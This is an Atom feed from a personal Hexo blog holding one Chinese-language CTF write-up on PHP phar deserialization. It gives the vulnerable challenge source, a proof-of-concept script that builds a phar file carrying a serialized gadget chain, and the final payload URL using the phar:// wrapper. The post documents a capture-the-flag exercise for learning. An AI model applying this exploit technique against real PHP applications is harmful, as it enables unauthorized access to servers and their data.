<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>42&#39;s Blog</title>
  
  <subtitle>Do not go gentle into that good night. Old age should burn and rave at close of the day.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-06-06T08:47:04.675Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>42</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>团队省赛选拔题</title>
    <link href="http://yoursite.com/2019/06/06/tags_test/"/>
    <id>http://yoursite.com/2019/06/06/tags_test/</id>
    <published>2019-06-06T06:31:27.841Z</published>
    <updated>2019-06-06T08:47:04.675Z</updated>
    
    <content type="html"><![CDATA[<p><code>phar反序列化</code></p><p><strong>引入</strong></p><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line">class hello</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $welcome;</span><br><span class="line"> </span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function simple_hello()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;welcome = &quot;hello &quot;.$this-&gt;name.&quot; welcome to ctf!&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        echo $this-&gt;welcome;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;simple_hello();</span><br><span class="line">                echo &apos;test&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class gogogo</span><br><span class="line">&#123;</span><br><span class="line">    public $one;</span><br><span class="line">    public $two;</span><br><span class="line"> </span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;one-&gt;get_flag();</span><br><span class="line">        return &apos;0&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class nice</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $flag;</span><br><span class="line"> </span><br><span class="line">    public function __construct($flag, $file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;flag = $flag;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function check()</span><br><span class="line">    &#123;</span><br><span class="line">        chdir(&apos;upload&apos;);</span><br><span class="line">        if(file_exists($this-&gt;file.&quot;.jpg&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &apos;file exist&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &apos;file not exist&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">                public function get_flag()</span><br><span class="line">                &#123;</span><br><span class="line">                      echo $this-&gt;flag.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line">@$a = $_GET[&apos;filename&apos;];</span><br><span class="line">$e = new nice($flag, $a);</span><br><span class="line">$e-&gt;check();</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><hr><p>刚刚拿到这道题的时候，发现存在多个PHP魔术方法，明显是反序列化；<br>但进一步审计发现并没有任何userialize的地方，经过搜索发现存在一种名为<code>phar反序列化</code>漏洞，即在不利用<code>unserialize()</code>函数的情况下，利用文件操作函数（<code>file_exits、is_dir等</code>）实现反序列化。</p><hr><br>首先分析一波phar文件的结构：phar本质上是一种压缩文件，其中`meta-data`部分需要被序列化之后存储，利用该漏洞的核心便是当文件操作函数结合`phar://伪协议`时会将phar文件中的`meta-data`部分反序列化，这时我们构造的序列化攻击链就会发挥作用其次，phar文件结构中还要添加被压缩的文件名（ex：test.jpg），之前由于一直未注意到这个问题导致题目卡了很长时间。。。。   <p><img src="C:%5CUsers%5C16789%5CPictures%5Cblog%5Caaa.jpg" alt="phar文件结构"></p><hr><br>经过以上分析，我们可以写一个php文件（该文件中已将序列化构造链传到meta-data，本体攻击链构造较为简单，就不详述），访问该php文件会在目录下生成一个phar文件：<p><strong><em>POC</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class hello</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $welcome;</span><br><span class="line">    </span><br><span class="line">    public function simple_hello()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;welcome = &quot;hello &quot;.$this-&gt;name.&quot; welcome to ctf!&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        echo $this-&gt;welcome;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;simple_hello();</span><br><span class="line">                echo &apos;test&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class gogogo</span><br><span class="line">&#123;</span><br><span class="line">    public $one;</span><br><span class="line">    public $two;</span><br><span class="line">     </span><br><span class="line"> </span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;one-&gt;get_flag();</span><br><span class="line">        return &apos;0&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class nice</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $flag; </span><br><span class="line"> </span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;flag.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$he = new hello();</span><br><span class="line">$he -&gt;name = new gogogo();</span><br><span class="line">$he -&gt;name -&gt; one = new nice();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$phar = new Phar(&apos;phar.phar&apos;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&apos;&lt;?php __HALT_COMPILER();?&gt;&apos;);</span><br><span class="line">$phar -&gt; addFromString(&apos;test.txt&apos;,&apos;test&apos;);</span><br><span class="line">$phar -&gt; setMetadata($he);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><hr><br>生成`phar.phar`文件之后，将其后缀名改为.jpg直接上传，上传后在存在各种类源码的ctf.php页面传入fiename参数。（ex：`ctf.php?filename=phar://upload/phar.jpg`）本来以为这道题就这样了，flag就会出来了，但怎么尝试上传flag就是不会回显，心态也有点崩。。。后经大佬提示，源码中47行check()函数：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function check()</span><br><span class="line">    &#123;</span><br><span class="line">        chdir(&apos;upload&apos;);</span><br><span class="line">        if(file_exists($this-&gt;file.&quot;.jpg&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &apos;file exist&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &apos;file not exist&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现首先会将目录切换到upload并且会在file属性后拼接一个“<code>.jpg</code>“，这样的话，就需要将原来添加的压缩文件名“<code>test.txt</code>”改为“<code>test.jpg</code>”以配合拼接<br>最终PAYLOAD：<code>ctf.php?filename=phar://phar.jpg/test</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;code&gt;phar反序列化&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;引入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://paper.seebug.org/680/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pa
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="PHP反序列化" scheme="http://yoursite.com/categories/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
</feed>
